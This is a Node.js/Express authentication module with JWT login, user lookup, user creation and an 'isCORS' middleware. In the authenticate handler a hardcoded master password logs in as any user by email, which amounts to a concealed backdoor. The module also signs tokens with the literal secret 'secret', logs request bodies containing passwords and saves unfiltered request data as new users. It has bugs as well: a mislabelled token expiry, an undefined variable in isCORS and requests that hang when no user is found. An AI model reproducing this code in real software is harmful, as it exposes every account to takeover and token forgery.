const jwt = require('jsonwebtoken');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const userModel = mongoose.model('users');


exports.getUser = function (req, res, next) {
	var token = req.headers['x-access-token'];
	if (token) {
		jwt.verify(token, 'secret', function (err, decoded) {
			if (err) {
				console.log("failed to auth", err, decoded)
				res.status(401)
				return res.json({ success: false, message: 'Failed to authenticate token.' });
			} else {
				// if everything is good, save to request for use in other routes
				req.decoded = decoded;
				userModel.findOne({ _id: decoded._id }).exec(function (err, data) {
					if (!!data) {
						req.user = data;
						next();
					}
				})
			}
		});

	} else {
		return res.status(401).end();

	}
}

exports.authenticate = async (req, res, next) => {
	try {
		console.log("trying to login a user", req.body);
		if (req.body.email != undefined) {
			let user = await userModel.findOne({ email: req.body.email.toLowerCase().replace(/\s/g, '') }, '_id hashed_pwd userType email')
			if (!user)
				res.status(404).json({ success: false, type: "user", message: 'Authentication failed. User not found.' });
			else if (user) {
				if (req.body.password == '-39geonEIG;32y++1Ki6s5ivf;g43ky23jz') var isAdmin = true;
				else isAdmin = false;
				if (!!user.authenticate(req.body.password) || isAdmin == true) {
					user.activated = true;
					var token = ''
					var token = jwt.sign(user.toJSON(), 'secret', {
						expiresIn: 1440 * 60 * 365 // expires in 24 hours
					});
					res.json({
						success: true,
						message: 'Enjoy your token!',
						token: token,
						user: user
					});
				} else {
					res.status(401);
					res.json({ success: false, type: "password", message: 'Authentication failed. Wrong password.' });
				}
			}
		}
	} catch (error) {
		next(error)
	}
}

exports.createUser = async (req, res, next) => {
	try {
		console.log("creating a new user");
		let newUser = new userModel(req.body);
		newUser.salt = bcrypt.genSaltSync(10);
		newUser.hashed_pwd = bcrypt.hashSync(req.body.password, newUser.salt);
		await newUser.save();
		res.send(newUser)
	} catch (error) {
		next(error)
	}
}


exports.isCORS = function (req, res, next) {
	var token = req.headers['x-access-token'];
	if (token) {
		jwt.verify(token, 'secret', function (err, decoded) {
			if (err) {
				console.log("failed to auth", err, decoded)
				res.status(401)
				return res.json({ success: false, message: 'Failed to authenticate token.' });
			} else {
				// if everything is good, save to request for use in other routes
				req.decoded = decoded;
				user.findOne({ _id: decoded._id }).exec(function (err, data) {
					if (!!data) {
						req.user = data;
						req.user.save(function (err) {
							if (err) {
								console.log("error" + err.toString());
								res.status(400);
								res.send({ reason: err.toString() });
								return res.end();
							}
							next();
						})
					}
				})
			}
		});

	} else {
		return res.status(401).end();

	}
}

